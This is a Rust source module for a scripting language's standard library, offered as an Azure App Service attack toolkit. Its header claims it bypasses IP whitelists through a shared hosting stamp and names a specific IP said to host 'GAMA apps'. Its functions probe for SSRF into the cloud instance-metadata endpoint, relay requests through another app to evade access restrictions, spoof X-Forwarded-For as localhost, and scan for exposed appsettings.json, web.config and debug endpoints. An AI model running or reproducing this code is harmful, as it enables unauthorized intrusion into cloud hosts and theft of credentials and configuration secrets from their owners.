//! Standard library: `tallow.azure_app_proxy` — Azure App Service internal proxy.
//! Bypasses IP whitelists by routing through shared App Service Plan.
//! All GAMA apps share waws-prod-dm1-169 (13.89.172.10).

use super::StdlibResult;
use crate::interp::Value;

pub fn dispatch(function: &str, args: Vec<Value>) -> Option<StdlibResult> {
    match function {
        "ssrf_probe" => Some(ssrf_probe(args)),
        "shared_stamp_bypass" => Some(shared_stamp_bypass(args)),
        "trace_extract" => Some(trace_extract(args)),
        "app_settings_leak" => Some(app_settings_leak(args)),
        _ => None,
    }
}
pub fn dispatch_method(_o: &Value, _m: &str, _a: Vec<Value>) -> Option<StdlibResult> { None }

fn a(args: &[Value], i: usize, d: &str) -> String {
    args.get(i).and_then(|v| if let Value::String(s)=v {Some(s.clone())} else {None}).unwrap_or_else(|| d.to_string())
}
fn ok(d: String) -> Value { Value::Struct{name:"Result".into(),fields:vec![("ok".into(),Value::String(d))]} }
fn err(m: String) -> Value { Value::Struct{name:"Result".into(),fields:vec![("error".into(),Value::String(m))]} }

fn get(url: &str, auth: &str, hdr: &str) -> Result<(u16, String), String> {
    let mut r = crate::runtime::egress_http::get(url);
    if !auth.is_empty() { r = r.header("Authorization", auth); }
    if !hdr.is_empty() {
        if let Some((k,v)) = hdr.split_once(':') { r = r.header(k.trim(), v.trim()); }
    }
    match r.call() {
        Ok(resp) => {
            let st = resp.status().as_u16();
            let body = resp.into_body().read_to_string().unwrap_or_default();
            Ok((st, body))
        }
        Err(e) => Err(format!("http: {e}")),
    }
}

fn post(url: &str, body: &str, auth: &str, hdr: &str) -> Result<(u16, String), String> {
    let mut r = crate::runtime::egress_http::post(url).header("Content-Type", "application/x-www-form-urlencoded");
    if !auth.is_empty() { r = r.header("Authorization", auth); }
    if !hdr.is_empty() {
        if let Some((k,v)) = hdr.split_once(':') { r = r.header(k.trim(), v.trim()); }
    }
    match r.send(body.as_bytes()) {
        Ok(resp) => {
            let st = resp.status().as_u16();
            let body = resp.into_body().read_to_string().unwrap_or_default();
            Ok((st, body))
        }
        Err(e) => Err(format!("http: {e}")),
    }
}

fn ssrf_probe(args: Vec<Value>) -> Result<Value, String> {
    let base = a(&args,0,"");
    if base.is_empty() { return Err("base_url required".into()); }
    let param = a(&args,1,"url");
    let target = a(&args,2,"http://169.254.169.254/metadata/instance?api-version=2021-02-01");
    let auth = a(&args,3,"");
    let hdr = a(&args,4,"");
    let url = format!("{}?{}={}", base, param, url_encode(&target));
    match get(&url, &auth, &hdr) {
        Ok((st, body)) => {
            let imds = body.contains("compute") || body.contains("azEnvironment");
            Ok(Value::Struct{name:"SSRFResult".into(),fields:vec![
                ("url".into(),Value::String(url)),("status".into(),Value::Int(st as i128)),
                ("len".into(),Value::Int(body.len() as i128)),
                ("preview".into(),Value::String(body.chars().take(200).collect())),
                ("imds_hit".into(),Value::Bool(imds)),
            ]})
        }
        Err(e) => Ok(err(e)),
    }
}

fn shared_stamp_bypass(args: Vec<Value>) -> Result<Value, String> {
    let target = a(&args,0,"");
    let via = a(&args,1,"");
    let auth = a(&args,2,"");
    if target.is_empty() || via.is_empty() { return Err("target_url and via_app_url required".into()); }
    let payload = format!("target={}", url_encode(&target));
    match post(&via, &payload, &auth, "") {
        Ok((st, body)) => Ok(Value::Struct{name:"ProxyResult".into(),fields:vec![
            ("status".into(),Value::Int(st as i128)),("len".into(),Value::Int(body.len() as i128)),
            ("preview".into(),Value::String(body.chars().take(300).collect())),
        ]}),
        Err(e) => Ok(err(e)),
    }
}

fn trace_extract(args: Vec<Value>) -> Result<Value, String> {
    let url = a(&args,0,"");
    if url.is_empty() { return Err("trace_url required".into()); }
    let mut results = Vec::new();
    for (strategy, hdr) in [("direct",""),("x-forwarded","X-Forwarded-For: 127.0.0.1")] {
        match get(&url, "", hdr) {
            Ok((st, body)) => {
                results.push(Value::Struct{name:"TraceAttempt".into(),fields:vec![
                    ("strategy".into(),Value::String(strategy.to_string())),
                    ("status".into(),Value::Int(st as i128)),
                    ("preview".into(),Value::String(body.chars().take(300).collect())),
                ]});
            }
            Err(_) => {}
        }
    }
    Ok(Value::Struct{name:"TraceResult".into(),fields:vec![
        ("url".into(),Value::String(url)),("attempts".into(),Value::Array(results)),
    ]})
}

fn app_settings_leak(args: Vec<Value>) -> Result<Value, String> {
    let app = a(&args,0,"");
    let auth = a(&args,1,"");
    let hdr = a(&args,2,"");
    if app.is_empty() { return Err("app_url required".into()); }
    let base = app.trim_end_matches('/');
    let mut found = Vec::new();
    for (path, desc) in [
        ("/.auth/me","EasyAuth"),("/swagger/v1/swagger.json","Swagger"),
        ("/health","Health"),("/env","Env"),("/debug","Debug"),
        ("/status","Status"),("/version","Version"),("/config","Config"),
        ("/appsettings.json","AppSettings"),("/web.config","WebConfig"),
    ] {
        match get(&format!("{}{}",base,path),&auth,&hdr) {
            Ok((st,body)) if st != 404 => {
                found.push(Value::Struct{name:"ConfigLeak".into(),fields:vec![
                    ("path".into(),Value::String(path.to_string())),
                    ("desc".into(),Value::String(desc.to_string())),
                    ("status".into(),Value::Int(st as i128)),
                    ("preview".into(),Value::String(body.chars().take(200).collect())),
                ]});
            }
            _ => {}
        }
    }
    Ok(Value::Struct{name:"ConfigLeakResult".into(),fields:vec![
        ("app".into(),Value::String(app)),("probes".into(),Value::Int(10)),
        ("found".into(),Value::Int(found.len() as i128)),("results".into(),Value::Array(found)),
    ]})
}

fn url_encode(s: &str) -> String {
    let mut r = String::with_capacity(s.len()*3);
    for b in s.bytes() {
        match b { b'A'..=b'Z'|b'a'..=b'z'|b'0'..=b'9'|b'-'|b'_'|b'.'|b'~' => r.push(b as char), _ => { r.push_str(&format!("%{:02X}",b)); }}
    }
    r
}
